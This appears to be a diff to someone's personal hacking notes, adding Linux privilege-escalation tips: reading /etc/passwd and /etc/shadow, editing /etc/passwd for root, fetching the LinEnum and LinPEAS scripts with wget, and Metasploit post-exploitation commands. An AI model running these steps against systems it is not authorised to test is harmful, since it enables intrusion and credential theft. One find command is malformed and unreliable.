@@ -217,11 +217,18 @@ Random notes I've made while learning about hacking that might prove useful in t
 - find important file or process: `cat ~/.bashrc`
 - `sudo -V` (< 1.8.28 are vulnerable to CVE-2019-14287)'
 - check what we can sudo: `sudo -l`
+- check files in /etc for passwords and other information (/etc/passwd, /etc/shadow, /etc/hosts)
+- edit /etc/passwd to get root: https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+
 - `whoami` and `id`
 - show distrubution version:`lsb_release -a`
 - show current shell: `echo $0`
 - find SSH keys: `find / -name id_rsa 2> /dev/null`
 - show host MOTD: `cat /etc/update-motd.d/00-header`
+
+### Find command
+- look for all files with `.log` extension: `find type -f -name "*.log 2>/dev/null"`
+- also interesting files: .bak (backup), .conf (configuration)
 
 ### find SUID bit Linux
 - `find / -perm -u=s -type f 2>/dev/null`
@@ -253,8 +260,8 @@ Random notes I've made while learning about hacking that might prove useful in t
 - more info here: https://www.hackingarticles.in/lxd-privilege-escalation/
 
 ### Useful privesc scripts
-- LinEnum.sh, download: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-- LinPEAS
+- LinEnum.sh, download: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+- LinPEAS: `wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`
 - linuxprivchecker.py
 - unixprivesc.py
 
@@ -438,6 +445,10 @@ Output file contents:
 - Post exploit recon for vulnerabilities: `run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true`
 - forcing RDP on a Windows machine: `run post/windows/manage/enable_rdp`
 - adding a route: `run autoroute -s 172.18.1.0 -n 255.255.255.0`
+
+## Netstat
+- list all tcp connections: `netstat -at | less`
+- also useful: `netstat -tulpn`
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Windows
 - possible stored credentials: `C:\Program Files\FileZilla Server\FileZilla Server.xml`
